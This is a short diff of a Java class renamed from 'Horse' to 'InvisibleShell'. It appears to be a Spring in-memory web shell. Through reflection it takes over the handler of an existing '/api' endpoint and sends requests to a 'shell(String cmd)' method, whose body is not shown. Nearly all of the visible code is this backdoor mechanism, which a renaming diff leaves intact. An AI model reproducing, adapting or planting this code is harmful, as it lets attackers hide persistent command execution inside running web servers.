@@ -1,4 +1,4 @@
-package com.example.spring;
+package exp;
 
 import org.springframework.core.MethodParameter;
 import org.springframework.web.context.WebApplicationContext;
@@ -17,11 +17,11 @@ import java.lang.reflect.Modifier;
 import java.util.HashMap;
 import java.util.Map;
 
-public class Horse {
+public class InvisibleShell {
     static final String targetPath = "/api";
     static final String text = "ok";
 
-    public Horse() {
+    public InvisibleShell() {
         try {
             WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes()
                     .getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
@@ -52,7 +52,7 @@ public class Horse {
 
                 HashMap<RequestMappingInfo, Object> registry =
                         (HashMap<RequestMappingInfo, Object>) _registry.get(mappingRegistry);
-                Method targetMethod = Horse.class.getMethod("shell", String.class);
+                Method targetMethod = InvisibleShell.class.getMethod("shell", String.class);
 
                 for (Map.Entry<RequestMappingInfo, Object> entry : registry.entrySet()) {
                     if (entry.getKey().getPatternsCondition().getPatterns().contains(targetPath)) {
@@ -74,7 +74,7 @@ public class Horse {
                         beanModifiersField.setAccessible(true);
                         beanModifiersField.setInt(_bean, _bean.getModifiers() & ~Modifier.FINAL);
 
-                        _bean.set(handlerMethod, new Horse("horse"));
+                        _bean.set(handlerMethod, new InvisibleShell("horse"));
 
                         Field _parameters = handlerMethod.getClass().getDeclaredField("parameters");
                         _parameters.setAccessible(true);
@@ -93,7 +93,7 @@ public class Horse {
         }
     }
 
-    public Horse(String name) {
+    public InvisibleShell(String name) {
     }
 
     public String shell(String cmd) throws IOException {
